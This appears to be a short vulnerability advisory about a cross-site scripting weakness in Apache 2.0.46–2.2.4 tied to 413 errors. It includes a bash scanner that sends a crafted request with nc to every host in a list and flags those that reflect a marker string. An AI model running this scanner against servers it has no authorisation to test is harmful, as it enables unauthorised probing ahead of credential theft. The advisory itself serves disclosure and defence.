source: http://www.securityfocus.com/bid/26663/info

Apache is prone to a cross-site scripting weakness when handling HTTP request methods that result in 413 HTTP errors.

An attacker may exploit this issue to steal cookie-based authentication credentials and launch other attacks.

Apache 2.0.46 through 2.2.4 are vulnerable; other versions may also be affected. 

#!/bin/bash
# PR07-37-scan
if [ $# -ne 1 ]
then
       echo "$0 <hosts-file>"
       exit
fi

for i in `cat $1`
do

if echo -en "<PROCHECKUP> / HTTP/1.1\nHost: $i\nConnection: 
close\nContent-length: 0\nContent-length: 0\n\n" | nc -w 4 $i 80 | grep 
-i '<PROCHECKUP>' > /dev/null
then
       echo "$i is VULNERABLE!"
fi

done 